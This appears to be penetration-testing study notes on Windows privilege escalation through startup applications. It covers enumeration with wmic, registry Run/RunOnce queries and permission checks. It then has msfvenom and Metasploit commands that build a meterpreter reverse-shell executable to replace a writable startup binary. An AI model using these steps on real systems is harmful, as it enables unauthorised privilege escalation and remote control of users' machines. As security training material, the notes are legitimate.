# Windows Startup Applications

- Find applications that run on startup
- Can you modify the binary?
  - what permissions would you gain? - target administrator users. 
- Replace the binary 

- Can everyone write to the startup folder? 
  - if so pop a binary in there and you will exploit users that are logging in.

## Enumeration

- WMI

```
wmic startup get caption,command
```

- Startup folder

```
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
```

- Registry

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

- Check the file permissions 

```
icacls.exe "Path to binary/folder "
```

```
Get-Acl -Path "Path to folder" | fl
```

## Exploitation

- Metasploit

```
use multi/handler
set payload windows.meterpreter/reverse_tcp
set LHOST

msfvenom -p windows/meterpreter/reverse_tcp lhost= -f exe -o program.exe
```

- Copy the payload to the host
- Replace the affected binary 

